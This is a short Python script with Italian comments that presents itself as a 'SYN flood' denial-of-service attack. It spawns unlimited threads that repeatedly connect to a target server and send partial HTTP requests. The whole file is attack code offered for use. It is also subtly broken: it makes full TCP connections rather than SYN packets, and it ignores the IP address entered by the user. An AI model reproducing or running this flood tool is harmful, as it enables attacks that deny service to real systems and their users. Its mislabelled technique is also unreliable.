import socket
import random
import threading

target_ip = '127.0.0.1'  # IP del server target
target_port = 80  # Porta del server target (HTTP in questo caso)

# Funzione che invia pacchetti SYN
def syn_flood():
    # Creazione del socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    # Creazione di un pacchetto SYN
    ip = target_ip
    port = target_port
    client.connect((ip, port))  # Connessione al server
    client.send(b'GET / HTTP/1.1\r\n')  # Invio della richiesta GET
    client.close()

# Funzione per lanciare più thread
def attack():
    target_ip = str(input("Indirizzo ip: \n->"))
    while True:
        try:
            threading.Thread(target=syn_flood).start()
        except:
            print('Errore durante il lancio del thread.')

# Esecuzione dell'attacco
attack()
